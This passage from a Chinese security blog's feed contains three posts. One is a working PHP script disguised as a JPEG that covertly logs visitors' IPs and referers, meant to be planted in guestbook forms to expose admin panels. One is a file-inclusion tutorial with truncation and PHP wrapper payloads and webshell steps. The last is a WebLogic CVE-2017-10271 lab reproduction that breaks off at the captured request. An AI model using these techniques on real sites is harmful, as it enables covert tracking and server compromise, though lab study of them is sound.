    </categories>
    
    
    <tags>
      
      <tag>漏洞复现</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>访问我的图片就获取你ip和访问地址</title>
    <link href="/p/a23ac9c4.html"/>
    <url>/p/a23ac9c4.html</url>
    
    <content type="html"><![CDATA[<h3 id="新建个名为-htaccess的文件，内容如下"><a href="#新建个名为-htaccess的文件，内容如下" class="headerlink" title="新建个名为.htaccess的文件，内容如下"></a>新建个名为.htaccess的文件，内容如下</h3><p><code>AddHandler application/x-httpd-php .jpg</code></p><h3 id="新建个1-jpg，内容如下"><a href="#新建个1-jpg，内容如下" class="headerlink" title="新建个1.jpg，内容如下"></a>新建个1.jpg，内容如下</h3><a id="more"></a><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter_dangerous_words</span>(<span class="hljs-params"><span class="hljs-variable">$str</span></span>)</span>&#123;        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&quot;‘&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;\&quot;&quot;</span>, <span class="hljs-string">&quot;“&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&lt;&quot;</span>, <span class="hljs-string">&quot;《&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-variable">$str</span> = str_replace(<span class="hljs-string">&quot;&gt;&quot;</span>, <span class="hljs-string">&quot;》&quot;</span>, <span class="hljs-variable">$str</span>);        <span class="hljs-keyword">return</span> <span class="hljs-variable">$str</span>;    &#125;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIP</span>(<span class="hljs-params"></span>) </span>&#123;        <span class="hljs-keyword">if</span> (getenv(<span class="hljs-string">&#x27;HTTP_CLIENT_IP&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_CLIENT_IP&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_X_FORWARDED&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED_FOR&#x27;</span>);        &#125;        <span class="hljs-keyword">elseif</span> (getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED&#x27;</span>)) &#123;        <span class="hljs-variable">$ip</span> = getenv(<span class="hljs-string">&#x27;HTTP_FORWARDED&#x27;</span>);        &#125;        <span class="hljs-keyword">else</span> &#123;        <span class="hljs-variable">$ip</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-variable">$ip</span>;    &#125;    <span class="hljs-variable">$ip</span> = getIP();    @<span class="hljs-variable">$referer</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>].<span class="hljs-string">&quot;\r\n&quot;</span>;    <span class="hljs-variable">$ua</span> = <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>].<span class="hljs-string">&quot;\r\n\r\n&quot;</span>;    date_default_timezone_set(<span class="hljs-string">&quot;Asia/Shanghai&quot;</span>);    <span class="hljs-variable">$date_</span> = date(<span class="hljs-string">&quot;Y.m.d,h:i:sa&quot;</span>).<span class="hljs-string">&quot;\r\n&quot;</span>;<span class="hljs-comment">//记录后台地址等信息</span>    <span class="hljs-variable">$hack</span> = <span class="hljs-string">&#x27;date: &#x27;</span>.<span class="hljs-variable">$date_</span>.<span class="hljs-string">&#x27;ip:&#x27;</span>.<span class="hljs-variable">$ip</span>.<span class="hljs-string">&quot;\r\n&quot;</span>.<span class="hljs-string">&#x27;referer: &#x27;</span>.<span class="hljs-variable">$referer</span>.<span class="hljs-string">&#x27;ua: &#x27;</span>.<span class="hljs-variable">$ua</span>;    <span class="hljs-variable">$hack</span> = filter_dangerous_words(<span class="hljs-variable">$hack</span>);    <span class="hljs-variable">$op</span> = fopen(<span class="hljs-string">&#x27;hack.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>);    fwrite(<span class="hljs-variable">$op</span>,<span class="hljs-variable">$hack</span>);    fclose(<span class="hljs-variable">$op</span>);<span class="hljs-comment">//伪装成图片</span>    <span class="hljs-variable">$im</span> = imagecreatefromjpeg(<span class="hljs-string">&quot;2.jpg&quot;</span>);<span class="hljs-comment">//注意该目录下，也要有2.jpg这个图片</span>    header(<span class="hljs-string">&#x27;Content-Type: image/jpeg&#x27;</span>);    imagejpeg(<span class="hljs-variable">$im</span>);    imagedestroy(<span class="hljs-variable">$im</span>); <span class="hljs-meta">?&gt;</span></code></pre><h3 id="放个正常图片，名为2-jpg。"><a href="#放个正常图片，名为2-jpg。" class="headerlink" title="放个正常图片，名为2.jpg。"></a>放个正常图片，名为2.jpg。</h3><h3 id="访问http-127-0-0-1-1-jpg"><a href="#访问http-127-0-0-1-1-jpg" class="headerlink" title="访问http://127.0.0.1/1.jpg"></a>访问<a href="http://127.0.0.1/1.jpg">http://127.0.0.1/1.jpg</a></h3><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>在留言板或者申请友链页面填信息，然后提交</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180131_%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80/01.png" alt="访问我的图片就获取你ip和访问地址"></p><p>等管理员在后台审核的时候看到这图片</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180131_%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80/02.png" alt="02"></p><p>此时就会在你该文件的相同目录下生成一个hack.txt</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180131_%E8%AE%BF%E9%97%AE%E6%88%91%E7%9A%84%E5%9B%BE%E7%89%87%E5%B0%B1%E8%8E%B7%E5%8F%96%E4%BD%A0ip%E5%92%8C%E8%AE%BF%E9%97%AE%E5%9C%B0%E5%9D%80/03.png" alt="03"></p><p>这样就获取到后台地址了。</p>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>学习文章</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>谈一谈文件包含漏洞</title>
    <link href="/p/4484eea8.html"/>
    <url>/p/4484eea8.html</url>
    
    <content type="html"><![CDATA[<h2 id="什么是文件包含"><a href="#什么是文件包含" class="headerlink" title="什么是文件包含"></a>什么是文件包含</h2><hr><blockquote><p>文件包含这个漏洞，简单来说既是程序猿在开发中为了方便，会将在多个页面重复使用的代码单独写到一个文件中，在需要用到的地方直接包含进来，包含后的文件既相当于将被包含的整个文件内容复制到了包含处。因为在开发中是经常用到的，因此成为了攻击者的目标，便衍生了多种文件包含的攻击。</p></blockquote><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><hr><a id="more"></a><p>先来感受一下，当包含值可被直接控制的情况下是怎么样的如以下代码：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);</code></pre><p>可看到以上代码，直接包含的 <code>$file</code> 这种情况下呢，就是可控的情况。</p><blockquote><p>先说一下文件包含的一个要点：文件包含可以包含任意文件，即便被包含的文件并不是与当前编程语言相关，甚至为图片，只要被包含的文件，其内容会被包含文件包含，并以包含文件当前语言执行。</p></blockquote><p>首先在当前文件夹内随便创建任意后缀格式的文件，如：<code>file.txt</code> （就算是图片格式那么效果也是如下）文件内容如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    phpinfo();</code></pre><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/01.png" alt="谈一谈文件包含漏洞"></p><p>文件包含漏洞在支持包含<code>web</code>应用内的目录的同时也直冲包含当前服务器内的其它文件，如下：<br>尝试包含<code>C盘</code>里的某个内容。如：<code>C:\WINDOWS\system.ini</code></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/02.png" alt="谈一谈文件包含漏洞"></p><p>可看到是直接被包含进来的。</p><p>那么上面说的是传入的文件值为全部可控的情况下的方法，那么如果程序猿在开发中固定死了所包含的文件后缀的话，怎么办？代码如下：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] . <span class="hljs-string">&#x27;.php&#x27;</span>;    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$file</span>;    <span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);</code></pre><p>这种情况下，我们按照上面的方法尝试一下,为了方便看到直观效果，这里<br>是将<code>$file</code>输出了。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/03.png" alt="谈一谈文件包含漏洞"></p><p>我们可以看到，如果在程序中固定死了后缀，那么就像上图一样，将会找不到需要包含的文件。可看到最后所包含的文件名为：<code>./include.txt.php</code>。</p><p>因此这就可以使用另一种方法，就是：<code>%00</code>截断。那么<code>%00</code>截断呢，是可以使用在非常多的地方的，这里不多讲。想了解的童鞋可以网上查一查相关资料。</p><p>这里先说一下PHP中使用<code>%00</code>的前提：</p><ol><li>PHP版本 &lt; 5.3 (不包括5.3) ;</li><li>PHP<code>magic_quotes_gpc = off</code>;</li><li>PHP对所接收的参数，如以上代码的<code>$_GET[&#39;file&#39;]</code>未使用<code>addslashes</code>函数</li></ol><p>因为PHP大于等于5.3的版本已经修复了这个问题，如果开启了<code>gpc</code>或者使用了<code>addslashes</code>函数的话则会对其进行转义。<br>首先我们可以试试如果在<code>gpc</code>开启的情况下会出现什么情况（效果与使用函数的为一致）</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/04.png" alt="谈一谈文件包含漏洞"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/05.png" alt="谈一谈文件包含漏洞"></p><p>可以看到了。效果是非常的明显。</p><p>接下来看看在5.3的情况是什么样的</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/06.png" alt="谈一谈文件包含漏洞"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/07.png" alt="谈一谈文件包含漏洞"></p><p>也可以看到。是没有任何效果的。</p><p>因此我们可以得知只要满足以上三种情况，那么就可以使用<code>%00</code>；<br>首先我们将PHP版本更换为5.2，然后在<code>php.ini</code>将 <code>magic_quotes_gpc = on</code>改为<code>magic_quotes_gpc = off</code>之后重启 <code>Apache</code>，在尝试下使用截断。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/08.png" alt="谈一谈文件包含漏洞"></p><p>成功使用截断包含。那么文件包含就只有包含的功能吗？那肯定不是的，既然是文件包含，那么我们可以直接包含一句话。先创建一个文件：<code>shell.txt</code>内容为一句话。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/09.png" alt="谈一谈文件包含漏洞"></p><p>可以看到，拿<code>shell</code>不是什么问题。</p><p>那么这两种包含有什么区别呢？其实是没有区别的，原理都一样，只不过第一种是将后缀一起传入，第二种则在程序内固定死了后缀。但是可以使用<code>%00</code>因为当程序流遇到<code>%00</code>终止符的时候将直接终止。</p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><blockquote><p>本地文件包含与远程文件包含的原理是相同的，不同点就是前者只能包含服务器内存在的文件，后者则可包含远程服务器内的文件。</p></blockquote><p>远程文件包含的注意点：</p><ol><li>需要 <code>php.ini</code> 内的 <code>allow_url_include = on</code> 以及 <code>allow_url_fopen=on</code></li><li>所需包含的远程文件后缀格式不能以目标服务器的语言相同，如（目标服务器解析PHP代码，那么远程文件后缀格式则不能为 <code>PHP</code> ）</li></ol><p>来解释一下第二点：因为如果你的远程文件是<code>php</code>后缀的话，那么如果你远程文件内容为：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>    phpinfo();</code></pre><p>那么在目标服务器内拿到的内容则是你的远程服务器执行<code>phpinfo()</code>后的一个内容，并不是这段代码，因此包含得到的信息并不是目标服务器的而是你远程服务器的。如下：<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/10.png" alt="谈一谈文件包含漏洞"></p><p>这个是我远程机的信息，为php5.6版本，目标机的是5.2版本。接下来包含一下。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/11.png" alt="谈一谈文件包含漏洞"></p><p>可以看到，包含后得到的结果就是我们远程机的，为什么呢？？<br>因为目标服务器包含的代码并不是：</p><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> phpinfo();<span class="hljs-meta">?&gt;</span></code></pre><p>而是远程服务器执行完这段代码的源代码，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/12.png" alt="谈一谈文件包含漏洞"></p><p>所以说远程文件包含只有符合了以上两点才能正常包含。<br>先来修改下：</p><ol><li><p>修改配置<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/13.png" alt="谈一谈文件包含漏洞"></p></li><li><p>修改文件后缀<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/14.png" alt="谈一谈文件包含漏洞"></p></li></ol><p>再来包含一下。<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/15.png" alt="谈一谈文件包含漏洞"></p><p>可以看到这次包含后返回的信息就是我们目标机的信息。</p><p>接下来继续尝试拿shell<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/16.png" alt="谈一谈文件包含漏洞"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/17.png" alt="谈一谈文件包含漏洞"></p><p>远程文件包含的利用前提其实就是符合本地文件包含的前提并且符合远程文件包含本身的前提即可利用。</p><h2 id="文件包含之伪协议"><a href="#文件包含之伪协议" class="headerlink" title="文件包含之伪协议"></a>文件包含之伪协议</h2><hr><p>伪协议在文件包含的利用，本文演示以下伪协议：<br><code>data:text/plain</code> 或 <code>data:text/plain;base64</code><br><code>php://input</code><br><code>php://filter</code><br><code>file://</code><br><code>zip://</code></p><p>其它协议可阅读官方文档：<a href="http://php.net/manual/zh/wrappers.php.php" title="直通车">直通车</a></p><p>data:text/plain</p><p>直接在对应URL参数内输出：<code>data:text/plain</code>,需要执行的php代码  如下图：<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/18.png" alt="谈一谈文件包含漏洞"></p><p>这个伪协议还有另一种使用方法，那么就是将需要执行的php代码使用base64编码：<code>data:text/plain;base64</code>,需要执行的<code>base64php</code>代码 如下图：<br><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/19.png" alt="谈一谈文件包含漏洞"></p><hr><p> php://input</p><p><code>php://input</code> 可以访问请求的原始数据的只读流, 将post请求中的数据作为PHP代码执行。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/20.png" alt="谈一谈文件包含漏洞"></p><p>可以看到程序内是固定死后缀的，那么在包含 <code>php://input</code> 的时候就会自动拼接上 <code>.php</code> 所以肯定是不能正常使用 <code>php://input</code>的。所以我们也是可以使用 <code>%00</code> 截断的</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/22.png" alt="谈一谈文件包含漏洞"></p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/23.png" alt="谈一谈文件包含漏洞"></p><p>可以看到终止符是非常强大的。</p><hr><p>php://filter</p><p><code>php://filter</code> 该伪协议可以读取php文件代码以base64编码输出，比如说我们想读取一个php文件但是不想让它正常php执行代码后的结果，我们想要这个php文件的代码的时候就可以使用这个伪协议。<br>使用方法：php://filter/read=convert.base64-encode/resource=需要读取的文件代码内容</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/24.png" alt="谈一谈文件包含漏洞"></p><p>解码后可得到内容</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/25.png" alt="谈一谈文件包含漏洞"></p><hr><p>file://</p><p><code>file://</code> 用于访问本地文件系统，且不受<code>allow_url_fopen</code>与<code>allow_url_include</code>的影响。<br>使用方法：file://文件绝对路径</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/26.png" alt="谈一谈文件包含漏洞"></p><hr><p>zip://</p><p><code>zip://</code>可以访问压缩文件中的文件。但是需要绝对路径。<br>使用方法：zip://[压缩包绝对路径]#[压缩文件内的文件名]</p><p>在本地创建一个文件，并且压缩成zip压缩包。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/27.png" alt="谈一谈文件包含漏洞"></p><p>可以看到我已经填写了绝对路径以及文件名称，但是为什么不能成功包含呢，可以看到它的报错 <code>Warning: include(zip://C:/phpStudy/WWW/include/phpinfo.zip.php) </code> 我们并不是包含这个文件，我们是要包含这个zip里面的文件，为什么<code>#</code>后面的值没了呢，是因为#会忽略后边的参数，所以我们需要使用编码<code>%23</code>的形式，还有一点就是程序里固定死了 php后缀，因为我们压缩的文件是为php后缀的。所以我们就不用带后缀了，如下图：</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/20180112_%E8%B0%88%E4%B8%80%E8%B0%88%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/28.png" alt="谈一谈文件包含漏洞"></p><p>转载自：<a href="http://www.bugsafe.cn/archives/167.html" title="http://www.bugsafe.cn/archives/167.html">http://www.bugsafe.cn/archives/167.html</a></p>]]></content>
    
    
    <categories>
      
      <category>学习文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>文件包含</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Weblogic(CVE-2017-10271)漏洞复现 附POC</title>
    <link href="/p/2be8fb79.html"/>
    <url>/p/2be8fb79.html</url>
    
    <content type="html"><![CDATA[<p><code>最近的CVE-2017-10271也是引起了一个小风波，所以趁着网速好的时候下载了一个Weblogic搭建起来打算进行一次复现。</code></p><p>看了别人的漏洞复现教程 只看到了他怎么用exp怼成功，没写太明白我饶了不少弯子。</p><h4 id="漏洞编号"><a href="#漏洞编号" class="headerlink" title="漏洞编号"></a>漏洞编号</h4><p>CVE-2017-10271</p><h4 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h4><p>Oracle WebLogic Server 10.3.6.0.0 版本<br>Oracle WebLogic Server 12.1.3.0.0 版本<br>Oracle WebLogic Server 12.2.1.1.0 版本</p><a id="more"></a><h4 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a>漏洞详情</h4><p>Oracle Fusion Middleware 中的 Oracle WebLogic Server 组件的 WLS Security 子组件存<br>在安全漏洞。使用精心构造的 xml 数据可能造成任意代码执行，攻击者只需要发送精心构造<br>的 HTTP 请求，就可以拿到目标服务器的权限。攻击者可利用该漏洞控制组件，影响数据的<br>可用性、保密性和完整性。</p><h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><div class="note note-success">            <p>漏洞环境： Windows 2003 R2</p><p>漏洞版本文件：如果是土豪用户复制下面的链接</p><p><code>链接: https://pan.baidu.com/s/1hunIGTI 密码: h4qn</code></p><p>不是土豪用户那就去官方下载对应漏洞版本，不然百度云的限速，限到你怀疑人生是否被日</p><p>weblogic官网下载地址<code>http://www.oracle.com/technetwork/middleware/weblogic/downloads/wls-for-dev-1703574.html</code></p>          </div><h4 id="安装过程"><a href="#安装过程" class="headerlink" title="安装过程"></a>安装过程</h4><p>下载完成安装方法 cmd命令：<code>cd C:\Program Files (x86)\Java\jdk1.7.0_80\bin</code> 这个目录下 执行 <code>java -jar xxx.jar（漏洞文件地址）</code> 每个人的java安装目录不一样，请自行改写。</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171224_Weblogic_CVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_%E9%99%84POC/01.png" alt="Weblogic(CVE-2017-10271)漏洞复现 附POC"></p><p>之后弹出配置界面我默认选择下一步。君随便！</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171224_Weblogic_CVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_%E9%99%84POC/05.png" alt="Weblogic(CVE-2017-10271)漏洞复现 附POC"></p><p>安装完成</p><h4 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h4><p>如果访问/wls-wsat/CoordinatorPortType 目录，存在下图则说明或许存在漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/root-iceH/root-iceH.github.io/images/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/20171224_Weblogic_CVE-2017-10271%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0_%E9%99%84POC/02.png" alt="Weblogic(CVE-2017-10271)漏洞复现 附POC"></p><p><strong>1.访问我靶机地址。开启burp抓包</strong></p><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">64.128</span>:<span class="hljs-number">7001</span><span class="hljs-regexp">/wls-wsat/</span>CoordinatorPortType</code></pre><p><strong>2.这是burp拦截到包是这样的</strong></p><pre><code class="hljs apache"><span class="hljs-attribute">GET</span> /wls-wsat/CoordinatorPortType HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><span class="hljs-attribute">Host</span>: <span class="hljs-number">192.168.64.128:7001</span><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><span class="hljs-attribute">User</span>-Agent: Mozilla/<span 